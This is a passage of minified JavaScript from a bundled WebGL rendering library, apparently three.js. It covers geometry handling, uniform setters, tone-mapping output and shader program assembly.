E=_.target;E.removeEventListener("dispose",p);const T=e.get(E);T!==void 0&&(e.delete(E),T.dispose())}function x(_){const E=_.target;E.removeEventListener("dispose",x);const T=i.get(E);T!==void 0&&(i.delete(E),T.dispose())}function v(){e=new WeakMap,i=new WeakMap,s!==null&&(s.dispose(),s=null)}return{get:c,dispose:v}}function LA(o){const e={};function i(s){if(e[s]!==void 0)return e[s];const c=o.getExtension(s);return e[s]=c,c}return{has:function(s){return i(s)!==null},init:function(){i("EXT_color_buffer_float"),i("WEBGL_clip_cull_distance"),i("OES_texture_float_linear"),i("EXT_color_buffer_half_float"),i("WEBGL_multisampled_render_to_texture"),i("WEBGL_render_shared_exponent")},get:function(s){const c=i(s);return c===null&&eo("WebGLRenderer: "+s+" extension not supported."),c}}}function OA(o,e,i,s){const c={},f=new WeakMap;function d(v){const _=v.target;_.index!==null&&e.remove(_.index);for(const T in _.attributes)e.remove(_.attributes[T]);_.removeEventListener("dispose",d),delete c[_.id];const E=f.get(_);E&&(e.remove(E),f.delete(_)),s.releaseStatesOfGeometry(_),_.isInstancedBufferGeometry===!0&&delete _._maxInstanceCount,i.memory.geometries--}function h(v,_){return c[_.id]===!0||(_.addEventListener("dispose",d),c[_.id]=!0,i.memory.geometries++),_}function m(v){const _=v.attributes;for(const E in _)e.update(_[E],o.ARRAY_BUFFER)}function p(v){const _=[],E=v.index,T=v.attributes.position;let w=0;if(T===void 0)return;if(E!==null){const N=E.array;w=E.version;for(let B=0,C=N.length;B<C;B+=3){const U=N[B+0],D=N[B+1],P=N[B+2];_.push(U,D,D,P,P,U)}}else{const N=T.array;w=T.version;for(let B=0,C=N.length/3-1;B<C;B+=3){const U=B+0,D=B+1,P=B+2;_.push(U,D,D,P,P,U)}}const y=new(T.count>=65535?Qx:jx)(_,1);y.version=w;const S=f.get(v);S&&e.remove(S),f.set(v,y)}function x(v){const _=f.get(v);if(_){const E=v.index;E!==null&&_.version<E.version&&p(v)}else p(v);return f.get(v)}return{get:h,update:m,getWireframeAttribute:x}}function PA(o,e,i){let s;function c(v){s=v}let f,d;function h(v){f=v.type,d=v.bytesPerElement}function m(v,_){o.drawElements(s,_,f,v*d),i.update(_,s,1)}function p(v,_,E){E!==0&&(o.drawElementsInstanced(s,_,f,v*d,E),i.update(_,s,E))}function x(v,_,E){if(E===0)return;e.get("WEBGL_multi_draw").multiDrawElementsWEBGL(s,_,0,f,v,0,E);let w=0;for(let y=0;y<E;y++)w+=_[y];i.update(w,s,1)}this.setMode=c,this.setIndex=h,this.render=m,this.renderInstances=p,this.renderMultiDraw=x}function IA(o){const e={geometries:0,textures:0},i={frame:0,calls:0,triangles:0,points:0,lines:0};function s(f,d,h){switch(i.calls++,d){case o.TRIANGLES:i.triangles+=h*(f/3);break;case o.LINES:i.lines+=h*(f/2);break;case o.LINE_STRIP:i.lines+=h*(f-1);break;case o.LINE_LOOP:i.lines+=h*f;break;case o.POINTS:i.points+=h*f;break;default:Ie("WebGLInfo: Unknown draw mode:",d);break}}function c(){i.calls=0,i.triangles=0,i.points=0,i.lines=0}return{memory:e,render:i,programs:null,autoReset:!0,reset:c,update:s}}function zA(o,e,i){const s=new WeakMap,c=new ln;function f(d,h,m){const p=d.morphTargetInfluences,x=h.morphAttributes.position||h.morphAttributes.normal||h.morphAttributes.color,v=x!==void 0?x.length:0;let _=s.get(h);if(_===void 0||_.count!==v){let F=function(){b.dispose(),s.delete(h),h.removeEventListener("dispose",F)};var E=F;_!==void 0&&_.texture.dispose();const T=h.morphAttributes.position!==void 0,w=h.morphAttributes.normal!==void 0,y=h.morphAttributes.color!==void 0,S=h.morphAttributes.position||[],N=h.morphAttributes.normal||[],B=h.morphAttributes.color||[];let C=0;T===!0&&(C=1),w===!0&&(C=2),y===!0&&(C=3);let U=h.attributes.position.count*C,D=1;U>e.maxTextureSize&&(D=Math.ceil(U/e.maxTextureSize),U=e.maxTextureSize);const P=new Float32Array(U*D*4*v),b=new Yx(P,U,D,v);b.type=ia,b.needsUpdate=!0;const L=C*4;for(let V=0;V<v;V++){const $=S[V],ft=N[V],j=B[V],et=U*D*4*V;for(let q=0;q<$.count;q++){const W=q*L;T===!0&&(c.fromBufferAttribute($,q),P[et+W+0]=c.x,P[et+W+1]=c.y,P[et+W+2]=c.z,P[et+W+3]=0),w===!0&&(c.fromBufferAttribute(ft,q),P[et+W+4]=c.x,P[et+W+5]=c.y,P[et+W+6]=c.z,P[et+W+7]=0),y===!0&&(c.fromBufferAttribute(j,q),P[et+W+8]=c.x,P[et+W+9]=c.y,P[et+W+10]=c.z,P[et+W+11]=j.itemSize===4?c.w:1)}}_={count:v,texture:b,size:new Ue(U,D)},s.set(h,_),h.addEventListener("dispose",F)}if(d.isInstancedMesh===!0&&d.morphTexture!==null)m.getUniforms().setValue(o,"morphTexture",d.morphTexture,i);else{let T=0;for(let y=0;y<p.length;y++)T+=p[y];const w=h.morphTargetsRelative?1:1-T;m.getUniforms().setValue(o,"morphTargetBaseInfluence",w),m.getUniforms().setValue(o,"morphTargetInfluences",p)}m.getUniforms().setValue(o,"morphTargetsTexture",_.texture,i),m.getUniforms().setValue(o,"morphTargetsTextureSize",_.size)}return{update:f}}function BA(o,e,i,s,c){let f=new WeakMap;function d(p){const x=c.render.frame,v=p.geometry,_=e.get(p,v);if(f.get(_)!==x&&(e.update(_),f.set(_,x)),p.isInstancedMesh&&(p.hasEventListener("dispose",m)===!1&&p.addEventListener("dispose",m),f.get(p)!==x&&(i.update(p.instanceMatrix,o.ARRAY_BUFFER),p.instanceColor!==null&&i.update(p.instanceColor,o.ARRAY_BUFFER),f.set(p,x))),p.isSkinnedMesh){const E=p.skeleton;f.get(E)!==x&&(E.update(),f.set(E,x))}return _}function h(){f=new WeakMap}function m(p){const x=p.target;x.removeEventListener("dispose",m),s.releaseStatesOfObject(x),i.remove(x.instanceMatrix),x.instanceColor!==null&&i.remove(x.instanceColor)}return{update:d,dispose:h}}const FA={[Dx]:"LINEAR_TONE_MAPPING",[Ux]:"REINHARD_TONE_MAPPING",[Lx]:"CINEON_TONE_MAPPING",[Ox]:"ACES_FILMIC_TONE_MAPPING",[Ix]:"AGX_TONE_MAPPING",[zx]:"NEUTRAL_TONE_MAPPING",[Px]:"CUSTOM_TONE_MAPPING"};function HA(o,e,i,s,c,f){const d=new Bi(e,i,{type:o,depthBuffer:c,stencilBuffer:f,samples:s?4:0,storeMultisampledDepthBuffer:!1,storeMultisampledStencilBuffer:!1,resolveDepthBuffer:!1,resolveStencilBuffer:!1});let h=null,m=null;const p=new $n;p.setAttribute("position",new Wn([-1,3,0,-1,-1,0,3,-1,0],3)),p.setAttribute("uv",new Wn([0,2,0,0,2,0],2));const x=new Ub({uniforms:{tDiffuse:{value:null}},vertexShader:`
			precision highp float;

			uniform mat4 modelViewMatrix;
			uniform mat4 projectionMatrix;

			attribute vec3 position;
			attribute vec2 uv;

			varying vec2 vUv;

			void main() {
				vUv = uv;
				gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
			}`,fragmentShader:`
			precision highp float;

			uniform sampler2D tDiffuse;

			varying vec2 vUv;

			#include <tonemapping_pars_fragment>
			#include <colorspace_pars_fragment>

			void main() {
				gl_FragColor = texture2D( tDiffuse, vUv );

				#ifdef LINEAR_TONE_MAPPING
					gl_FragColor.rgb = LinearToneMapping( gl_FragColor.rgb );
				#elif defined( REINHARD_TONE_MAPPING )
					gl_FragColor.rgb = ReinhardToneMapping( gl_FragColor.rgb );
				#elif defined( CINEON_TONE_MAPPING )
					gl_FragColor.rgb = CineonToneMapping( gl_FragColor.rgb );
				#elif defined( ACES_FILMIC_TONE_MAPPING )
					gl_FragColor.rgb = ACESFilmicToneMapping( gl_FragColor.rgb );
				#elif defined( AGX_TONE_MAPPING )
					gl_FragColor.rgb = AgXToneMapping( gl_FragColor.rgb );
				#elif defined( NEUTRAL_TONE_MAPPING )
					gl_FragColor.rgb = NeutralToneMapping( gl_FragColor.rgb );
				#elif defined( CUSTOM_TONE_MAPPING )
					gl_FragColor.rgb = CustomToneMapping( gl_FragColor.rgb );
				#endif

				#ifdef SRGB_TRANSFER
					gl_FragColor = sRGBTransferOETF( gl_FragColor );
				#endif
			}`,depthTest:!1,depthWrite:!1}),v=new Oa(p,x),_=new sS(-1,1,1,-1,0,1);let E=null,T=null,w=!1,y,S=null,N=[],B=!1;this.setSize=function(C,U){d.setSize(C,U),h!==null&&h.setSize(C,U),m!==null&&m.setSize(C,U);for(let D=0;D<N.length;D++){const P=N[D];P.setSize&&P.setSize(C,U)}},this.setEffects=function(C){N=C,B=N.length>0&&N[0].isRenderPass===!0;const U=d.width,D=d.height;N.length>0&&h===null&&(h=new Bi(U,D,{type:oa,depthBuffer:!1,stencilBuffer:!1}),m=new Bi(U,D,{type:oa,depthBuffer:!1,stencilBuffer:!1}));for(let P=0;P<N.length;P++){const b=N[P];b.setSize&&b.setSize(U,D)}},this.begin=function(C,U){if(w||C.toneMapping===ra&&N.length===0)return!1;if(S=U,U!==null){const D=U.width,P=U.height;(d.width!==D||d.height!==P)&&this.setSize(D,P)}return B===!1&&C.setRenderTarget(d),y=C.toneMapping,C.toneMapping=ra,!0},this.hasRenderPass=function(){return B},this.end=function(C,U){C.toneMapping=y,w=!0;let D=d,P=h;for(let b=0;b<N.length;b++){const L=N[b];L.enabled!==!1&&(L.render(C,P,D,U),L.needsSwap!==!1&&(D=P,P=P===h?m:h))}if(E!==C.outputColorSpace||T!==C.toneMapping){E=C.outputColorSpace,T=C.toneMapping,x.defines={},we.getTransfer(E)===qe&&(x.defines.SRGB_TRANSFER="");const b=FA[T];b&&(x.defines[b]=""),x.needsUpdate=!0}x.uniforms.tDiffuse.value=D.texture,C.setRenderTarget(S),C.render(v,_),S=null,w=!1},this.isCompositing=function(){return w},this.dispose=function(){d.dispose(),h!==null&&h.dispose(),m!==null&&m.dispose(),p.dispose(),x.dispose()}}const uS=new Xn,Gp=new Sl(1,1),fS=new Yx,dS=new rb,hS=new nS,sx=[],ox=[],lx=new Float32Array(16),cx=new Float32Array(9),ux=new Float32Array(4);function oo(o,e,i){const s=o[0];if(s<=0||s>0)return o;const c=e*i;let f=sx[c];if(f===void 0&&(f=new Float32Array(c),sx[c]=f),e!==0){s.toArray(f,0);for(let d=1,h=0;d!==e;++d)h+=i,o[d].toArray(f,h)}return f}function Sn(o,e){if(o.length!==e.length)return!1;for(let i=0,s=o.length;i<s;i++)if(o[i]!==e[i])return!1;return!0}function yn(o,e){for(let i=0,s=e.length;i<s;i++)o[i]=e[i]}function Fu(o,e){let i=ox[e];i===void 0&&(i=new Int32Array(e),ox[e]=i);for(let s=0;s!==e;++s)i[s]=o.allocateTextureUnit();return i}function GA(o,e){const i=this.cache;i[0]!==e&&(o.uniform1f(this.addr,e),i[0]=e)}function VA(o,e){const i=this.cache;if(e.x!==void 0)(i[0]!==e.x||i[1]!==e.y)&&(o.uniform2f(this.addr,e.x,e.y),i[0]=e.x,i[1]=e.y);else{if(Sn(i,e))return;o.uniform2fv(this.addr,e),yn(i,e)}}function XA(o,e){const i=this.cache;if(e.x!==void 0)(i[0]!==e.x||i[1]!==e.y||i[2]!==e.z)&&(o.uniform3f(this.addr,e.x,e.y,e.z),i[0]=e.x,i[1]=e.y,i[2]=e.z);else if(e.r!==void 0)(i[0]!==e.r||i[1]!==e.g||i[2]!==e.b)&&(o.uniform3f(this.addr,e.r,e.g,e.b),i[0]=e.r,i[1]=e.g,i[2]=e.b);else{if(Sn(i,e))return;o.uniform3fv(this.addr,e),yn(i,e)}}function kA(o,e){const i=this.cache;if(e.x!==void 0)(i[0]!==e.x||i[1]!==e.y||i[2]!==e.z||i[3]!==e.w)&&(o.uniform4f(this.addr,e.x,e.y,e.z,e.w),i[0]=e.x,i[1]=e.y,i[2]=e.z,i[3]=e.w);else{if(Sn(i,e))return;o.uniform4fv(this.addr,e),yn(i,e)}}function WA(o,e){const i=this.cache,s=e.elements;if(s===void 0){if(Sn(i,e))return;o.uniformMatrix2fv(this.addr,!1,e),yn(i,e)}else{if(Sn(i,s))return;ux.set(s),o.uniformMatrix2fv(this.addr,!1,ux),yn(i,s)}}function qA(o,e){const i=this.cache,s=e.elements;if(s===void 0){if(Sn(i,e))return;o.uniformMatrix3fv(this.addr,!1,e),yn(i,e)}else{if(Sn(i,s))return;cx.set(s),o.uniformMatrix3fv(this.addr,!1,cx),yn(i,s)}}function YA(o,e){const i=this.cache,s=e.elements;if(s===void 0){if(Sn(i,e))return;o.uniformMatrix4fv(this.addr,!1,e),yn(i,e)}else{if(Sn(i,s))return;lx.set(s),o.uniformMatrix4fv(this.addr,!1,lx),yn(i,s)}}function ZA(o,e){const i=this.cache;i[0]!==e&&(o.uniform1i(this.addr,e),i[0]=e)}function KA(o,e){const i=this.cache;if(e.x!==void 0)(i[0]!==e.x||i[1]!==e.y)&&(o.uniform2i(this.addr,e.x,e.y),i[0]=e.x,i[1]=e.y);else{if(Sn(i,e))return;o.uniform2iv(this.addr,e),yn(i,e)}}function jA(o,e){const i=this.cache;if(e.x!==void 0)(i[0]!==e.x||i[1]!==e.y||i[2]!==e.z)&&(o.uniform3i(this.addr,e.x,e.y,e.z),i[0]=e.x,i[1]=e.y,i[2]=e.z);else{if(Sn(i,e))return;o.uniform3iv(this.addr,e),yn(i,e)}}function QA(o,e){const i=this.cache;if(e.x!==void 0)(i[0]!==e.x||i[1]!==e.y||i[2]!==e.z||i[3]!==e.w)&&(o.uniform4i(this.addr,e.x,e.y,e.z,e.w),i[0]=e.x,i[1]=e.y,i[2]=e.z,i[3]=e.w);else{if(Sn(i,e))return;o.uniform4iv(this.addr,e),yn(i,e)}}function JA(o,e){const i=this.cache;i[0]!==e&&(o.uniform1ui(this.addr,e),i[0]=e)}function $A(o,e){const i=this.cache;if(e.x!==void 0)(i[0]!==e.x||i[1]!==e.y)&&(o.uniform2ui(this.addr,e.x,e.y),i[0]=e.x,i[1]=e.y);else{if(Sn(i,e))return;o.uniform2uiv(this.addr,e),yn(i,e)}}function tR(o,e){const i=this.cache;if(e.x!==void 0)(i[0]!==e.x||i[1]!==e.y||i[2]!==e.z)&&(o.uniform3ui(this.addr,e.x,e.y,e.z),i[0]=e.x,i[1]=e.y,i[2]=e.z);else{if(Sn(i,e))return;o.uniform3uiv(this.addr,e),yn(i,e)}}function eR(o,e){const i=this.cache;if(e.x!==void 0)(i[0]!==e.x||i[1]!==e.y||i[2]!==e.z||i[3]!==e.w)&&(o.uniform4ui(this.addr,e.x,e.y,e.z,e.w),i[0]=e.x,i[1]=e.y,i[2]=e.z,i[3]=e.w);else{if(Sn(i,e))return;o.uniform4uiv(this.addr,e),yn(i,e)}}function nR(o,e,i){const s=this.cache,c=i.allocateTextureUnit();s[0]!==c&&(o.uniform1i(this.addr,c),s[0]=c);let f;this.type===o.SAMPLER_2D_SHADOW?(Gp.compareFunction=i.isReversedDepthBuffer()?$p:Jp,f=Gp):f=uS,i.setTexture2D(e||f,c)}function iR(o,e,i){const s=this.cache,c=i.allocateTextureUnit();s[0]!==c&&(o.uniform1i(this.addr,c),s[0]=c),i.setTexture3D(e||dS,c)}function aR(o,e,i){const s=this.cache,c=i.allocateTextureUnit();s[0]!==c&&(o.uniform1i(this.addr,c),s[0]=c),i.setTextureCube(e||hS,c)}function rR(o,e,i){const s=this.cache,c=i.allocateTextureUnit();s[0]!==c&&(o.uniform1i(this.addr,c),s[0]=c),i.setTexture2DArray(e||fS,c)}function sR(o){switch(o){case 5126:return GA;case 35664:return VA;case 35665:return XA;case 35666:return kA;case 35674:return WA;case 35675:return qA;case 35676:return YA;case 5124:case 35670:return ZA;case 35667:case 35671:return KA;case 35668:case 35672:return jA;case 35669:case 35673:return QA;case 5125:return JA;case 36294:return $A;case 36295:return tR;case 36296:return eR;case 35678:case 36198:case 36298:case 36306:case 35682:return nR;case 35679:case 36299:case 36307:return iR;case 35680:case 36300:case 36308:case 36293:return aR;case 36289:case 36303:case 36311:case 36292:return rR}}function oR(o,e){o.uniform1fv(this.addr,e)}function lR(o,e){const i=oo(e,this.size,2);o.uniform2fv(this.addr,i)}function cR(o,e){const i=oo(e,this.size,3);o.uniform3fv(this.addr,i)}function uR(o,e){const i=oo(e,this.size,4);o.uniform4fv(this.addr,i)}function fR(o,e){const i=oo(e,this.size,4);o.uniformMatrix2fv(this.addr,!1,i)}function dR(o,e){const i=oo(e,this.size,9);o.uniformMatrix3fv(this.addr,!1,i)}function hR(o,e){const i=oo(e,this.size,16);o.uniformMatrix4fv(this.addr,!1,i)}function pR(o,e){o.uniform1iv(this.addr,e)}function mR(o,e){o.uniform2iv(this.addr,e)}function gR(o,e){o.uniform3iv(this.addr,e)}function _R(o,e){o.uniform4iv(this.addr,e)}function vR(o,e){o.uniform1uiv(this.addr,e)}function xR(o,e){o.uniform2uiv(this.addr,e)}function SR(o,e){o.uniform3uiv(this.addr,e)}function yR(o,e){o.uniform4uiv(this.addr,e)}function MR(o,e,i){const s=this.cache,c=e.length,f=Fu(i,c);Sn(s,f)||(o.uniform1iv(this.addr,f),yn(s,f));let d;this.type===o.SAMPLER_2D_SHADOW?d=Gp:d=uS;for(let h=0;h!==c;++h)i.setTexture2D(e[h]||d,f[h])}function ER(o,e,i){const s=this.cache,c=e.length,f=Fu(i,c);Sn(s,f)||(o.uniform1iv(this.addr,f),yn(s,f));for(let d=0;d!==c;++d)i.setTexture3D(e[d]||dS,f[d])}function bR(o,e,i){const s=this.cache,c=e.length,f=Fu(i,c);Sn(s,f)||(o.uniform1iv(this.addr,f),yn(s,f));for(let d=0;d!==c;++d)i.setTextureCube(e[d]||hS,f[d])}function TR(o,e,i){const s=this.cache,c=e.length,f=Fu(i,c);Sn(s,f)||(o.uniform1iv(this.addr,f),yn(s,f));for(let d=0;d!==c;++d)i.setTexture2DArray(e[d]||fS,f[d])}function AR(o){switch(o){case 5126:return oR;case 35664:return lR;case 35665:return cR;case 35666:return uR;case 35674:return fR;case 35675:return dR;case 35676:return hR;case 5124:case 35670:return pR;case 35667:case 35671:return mR;case 35668:case 35672:return gR;case 35669:case 35673:return _R;case 5125:return vR;case 36294:return xR;case 36295:return SR;case 36296:return yR;case 35678:case 36198:case 36298:case 36306:case 35682:return MR;case 35679:case 36299:case 36307:return ER;case 35680:case 36300:case 36308:case 36293:return bR;case 36289:case 36303:case 36311:case 36292:return TR}}class RR{constructor(e,i,s){this.id=e,this.addr=s,this.cache=[],this.type=i.type,this.setValue=sR(i.type)}}class CR{constructor(e,i,s){this.id=e,this.addr=s,this.cache=[],this.type=i.type,this.size=i.size,this.setValue=AR(i.type)}}class wR{constructor(e){this.id=e,this.seq=[],this.map={}}setValue(e,i,s){const c=this.seq;for(let f=0,d=c.length;f!==d;++f){const h=c[f];h.setValue(e,i[h.id],s)}}}const Kh=/(\w+)(\])?(\[|\.)?/g;function fx(o,e){o.seq.push(e),o.map[e.id]=e}function NR(o,e,i){const s=o.name,c=s.length;for(Kh.lastIndex=0;;){const f=Kh.exec(s),d=Kh.lastIndex;let h=f[1];const m=f[2]==="]",p=f[3];if(m&&(h=h|0),p===void 0||p==="["&&d+2===c){fx(i,p===void 0?new RR(h,o,e):new CR(h,o,e));break}else{let v=i.map[h];v===void 0&&(v=new wR(h),fx(i,v)),i=v}}}class Au{constructor(e,i){this.seq=[],this.map={};const s=e.getProgramParameter(i,e.ACTIVE_UNIFORMS);for(let d=0;d<s;++d){const h=e.getActiveUniform(i,d),m=e.getUniformLocation(i,h.name);NR(h,m,this)}const c=[],f=[];for(const d of this.seq)d.type===e.SAMPLER_2D_SHADOW||d.type===e.SAMPLER_CUBE_SHADOW||d.type===e.SAMPLER_2D_ARRAY_SHADOW?c.push(d):f.push(d);c.length>0&&(this.seq=c.concat(f))}setValue(e,i,s,c){const f=this.map[i];f!==void 0&&f.setValue(e,s,c)}setOptional(e,i,s){const c=i[s];c!==void 0&&this.setValue(e,s,c)}static upload(e,i,s,c){for(let f=0,d=i.length;f!==d;++f){const h=i[f],m=s[h.id];m.needsUpdate!==!1&&h.setValue(e,m.value,c)}}static seqWithValue(e,i){const s=[];for(let c=0,f=e.length;c!==f;++c){const d=e[c];d.id in i&&s.push(d)}return s}}function dx(o,e,i){const s=o.createShader(e);return o.shaderSource(s,i),o.compileShader(s),s}const DR=37297;let UR=0;function LR(o,e){const i=o.split(`
`),s=[],c=Math.max(e-6,0),f=Math.min(e+6,i.length);for(let d=c;d<f;d++){const h=d+1;s.push(`${h===e?">":" "} ${h}: ${i[d]}`)}return s.join(`
`)}const hx=new de;function OR(o){we._getMatrix(hx,we.workingColorSpace,o);const e=`mat3( ${hx.elements.map(i=>i.toFixed(4))} )`;switch(we.getTransfer(o)){case Nu:return[e,"LinearTransferOETF"];case qe:return[e,"sRGBTransferOETF"];default:return se("WebGLProgram: Unsupported color space: ",o),[e,"LinearTransferOETF"]}}function px(o,e,i){const s=o.getShaderParameter(e,o.COMPILE_STATUS),f=(o.getShaderInfoLog(e)||"").trim();if(s&&f==="")return"";const d=/ERROR: 0:(\d+)/.exec(f);if(d){const h=parseInt(d[1]);return i.toUpperCase()+`

`+f+`

`+LR(o.getShaderSource(e),h)}else return f}function PR(o,e){const i=OR(e);return[`vec4 ${o}( vec4 value ) {`,`	return ${i[1]}( vec4( value.rgb * ${i[0]}, value.a ) );`,"}"].join(`
`)}const IR={[Dx]:"Linear",[Ux]:"Reinhard",[Lx]:"Cineon",[Ox]:"ACESFilmic",[Ix]:"AgX",[zx]:"Neutral",[Px]:"Custom"};function zR(o,e){const i=IR[e];return i===void 0?(se("WebGLProgram: Unsupported toneMapping:",e),"vec3 "+o+"( vec3 color ) { return LinearToneMapping( color ); }"):"vec3 "+o+"( vec3 color ) { return "+i+"ToneMapping( color ); }"}const xu=new it;function BR(){we.getLuminanceCoefficients(xu);const o=xu.x.toFixed(4),e=xu.y.toFixed(4),i=xu.z.toFixed(4);return["float luminance( const in vec3 rgb ) {",`	const vec3 weights = vec3( ${o}, ${e}, ${i} );`,"	return dot( weights, rgb );","}"].join(`
`)}function FR(o){return[o.extensionClipCullDistance?"#extension GL_ANGLE_clip_cull_distance : require":"",o.extensionMultiDraw?"#extension GL_ANGLE_multi_draw : require":""].filter(ml).join(`
`)}function HR(o){const e=[];for(const i in o){const s=o[i];s!==!1&&e.push("#define "+i+" "+s)}return e.join(`
`)}function GR(o,e){const i={},s=o.getProgramParameter(e,o.ACTIVE_ATTRIBUTES);for(let c=0;c<s;c++){const f=o.getActiveAttrib(e,c),d=f.name;let h=1;f.type===o.FLOAT_MAT2&&(h=2),f.type===o.FLOAT_MAT3&&(h=3),f.type===o.FLOAT_MAT4&&(h=4),i[d]={type:f.type,location:o.getAttribLocation(e,d),locationSize:h}}return i}function ml(o){return o!==""}function mx(o,e){const i=e.numSpotLightShadows+e.numSpotLightMaps-e.numSpotLightShadowsWithMaps;return o.replace(/NUM_SUN_LIGHTS/g,e.numSunLights).replace(/NUM_DIR_LIGHTS/g,e.numDirLights).replace(/NUM_SPOT_LIGHTS/g,e.numSpotLights).replace(/NUM_SPOT_LIGHT_MAPS/g,e.numSpotLightMaps).replace(/NUM_SPOT_LIGHT_COORDS/g,i).replace(/NUM_RECT_AREA_LIGHTS/g,e.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,e.numPointLights).replace(/NUM_HEMI_LIGHTS/g,e.numHemiLights).replace(/NUM_SUN_LIGHT_SHADOWS/g,e.numSunLightShadows).replace(/NUM_DIR_LIGHT_SHADOWS/g,e.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS/g,e.numSpotLightShadowsWithMaps).replace(/NUM_SPOT_LIGHT_SHADOWS/g,e.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g,e.numPointLightShadows)}function gx(o,e){return o.replace(/NUM_CLIPPING_PLANES/g,e.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,e.numClippingPlanes-e.numClipIntersection)}const VR=/^[ \t]*#include +<([\w\d./]+)>/gm;function Vp(o){return o.replace(VR,kR)}const XR=new Map;function kR(o,e){let i=me[e];if(i===void 0){const s=XR.get(e);if(s!==void 0)i=me[s],se('WebGLRenderer: Shader chunk "%s" has been deprecated. Use "%s" instead.',e,s);else throw new Error("THREE.WebGLProgram: Can not resolve #include <"+e+">")}return Vp(i)}const WR=/#pragma unroll_loop_start\s+for\s*\(\s*int\s+i\s*=\s*(\d+)\s*;\s*i\s*<\s*(\d+)\s*;\s*i\s*\+\+\s*\)\s*{([\s\S]+?)}\s+#pragma unroll_loop_end/g;function _x(o){return o.replace(WR,qR)}function qR(o,e,i,s){let c="";for(let f=parseInt(e);f<parseInt(i);f++)c+=s.replace(/\[\s*i\s*\]/g,"[ "+f+" ]").replace(/UNROLLED_LOOP_INDEX/g,f);return c}function vx(o){let e=`precision ${o.precision} float;
	precision ${o.precision} int;
	precision ${o.precision} sampler2D;
	precision ${o.precision} samplerCube;
	precision ${o.precision} sampler3D;
	precision ${o.precision} sampler2DArray;
	precision ${o.precision} sampler2DShadow;
	precision ${o.precision} samplerCubeShadow;
	precision ${o.precision} sampler2DArrayShadow;
	precision ${o.precision} isampler2D;
	precision ${o.precision} isampler3D;
	precision ${o.precision} isamplerCube;
	precision ${o.precision} isampler2DArray;
	precision ${o.precision} usampler2D;
	precision ${o.precision} usampler3D;
	precision ${o.precision} usamplerCube;
	precision ${o.precision} usampler2DArray;
	`;return o.precision==="highp"?e+=`
#define HIGH_PRECISION`:o.precision==="mediump"?e+=`
#define MEDIUM_PRECISION`:o.precision==="lowp"&&(e+=`
#define LOW_PRECISION`),e}const YR={[yu]:"SHADOWMAP_TYPE_PCF",[pl]:"SHADOWMAP_TYPE_VSM"};function ZR(o){return YR[o.shadowMapType]||"SHADOWMAP_TYPE_BASIC"}const KR={[Kr]:"ENVMAP_TYPE_CUBE",[io]:"ENVMAP_TYPE_CUBE",[Iu]:"ENVMAP_TYPE_CUBE_UV"};function jR(o){return o.envMap===!1?"ENVMAP_TYPE_CUBE":KR[o.envMapMode]||"ENVMAP_TYPE_CUBE"}const QR={[io]:"ENVMAP_MODE_REFRACTION"};function JR(o){return o.envMap===!1?"ENVMAP_MODE_REFLECTION":QR[o.envMapMode]||"ENVMAP_MODE_REFLECTION"}const $R={[Nx]:"ENVMAP_BLENDING_MULTIPLY",[IE]:"ENVMAP_BLENDING_MIX",[zE]:"ENVMAP_BLENDING_ADD"};function t3(o){return o.envMap===!1?"ENVMAP_BLENDING_NONE":$R[o.combine]||"ENVMAP_BLENDING_NONE"}function e3(o){const e=o.envMapCubeUVHeight;if(e===null)return null;const i=Math.log2(e)-2,s=1/e;return{texelWidth:1/(3*Math.max(Math.pow(2,i),112)),texelHeight:s,maxMip:i}}function n3(o,e,i,s){const c=o.getContext(),f=i.defines;let d=i.vertexShader,h=i.fragmentShader;const m=ZR(i),p=jR(i),x=JR(i),v=t3(i),_=e3(i),E=FR(i),T=HR(f),w=c.createProgram();let y,S,N=i.glslVersion?"#version "+i.glslVersion+`
`:"";i.isRawShaderMaterial?(y=["#define SHADER_TYPE "+i.shaderType,"#define SHADER_NAME "+i.shaderName,T].filter(ml).join(`
`),y.length>0&&(y+=`
`),S=["#define SHADER_TYPE "+i.shaderType,"#define SHADER_NAME "+i.shaderName,T].filter(ml).join(`
`),S.length>0&&(S+=`
`)):(y=[vx(i),"#define SHADER_TYPE "+i.shaderType,"#define SHADER_NAME "+i.shaderName,T,i.extensionClipCullDistance?"#define USE_CLIP_DISTANCE":"",i.batching?"#define USE_BATCHING":"",i.batchingColor?"#define USE_BATCHING_COLOR":"",i.instancing?"#define USE_INSTANCING":"",i.instancingColor?"#define USE_INSTANCING_COLOR":"",i.instancingMorph?"#define USE_INSTANCING_MORPH":"",i.useFog&&i.fog?"#define USE_FOG":"",i.useFog&&i.fogExp2?"#define FOG_EXP2":"",i.map?"#define USE_MAP":"",i.envMap?"#define USE_ENVMAP":"",i.envMap?"#define "+x:"",i.lightMap?"#define USE_LIGHTMAP":"",i.aoMap?"#define USE_AOMAP":"",i.bumpMap?"#define USE_BUMPMAP":"",i.normalMap?"#define USE_NORMALMAP":"",i.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",i.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",i.displacementMap?"#define USE_DISPLACEMENTMAP":"",i.emissiveMap?"#define USE_EMISSIVEMAP":"",i.anisotropy?"#define USE_ANISOTROPY":"",i.anisotropyMap?"#define USE_ANISOTROPYMAP":"",i.clearcoatMap?"#define USE_CLEARCOATMAP":"",i.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",i.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",i.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",i.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",i.specularMap?"#define USE_SPECULARMAP":"",i.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",i.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",i.roughnessMap?"#define USE_ROUGHNESSMAP":"",i.metalnessMap?"#define USE_METALNESSMAP":"",i.alphaMap?"#define USE_ALPHAMAP":"",i.alphaHash?"#define USE_ALPHAHASH":"",i.transmission?"#define USE_TRANSMISSION":"",i.transmissionMap?"#define USE_TRANSMISSIONMAP":"",i.thicknessMap?"#define USE_THICKNESSMAP":"",i.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",i.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",i.mapUv?"#define MAP_UV "+i.mapUv:"",i.alphaMapUv?"#define ALPHAMAP_UV 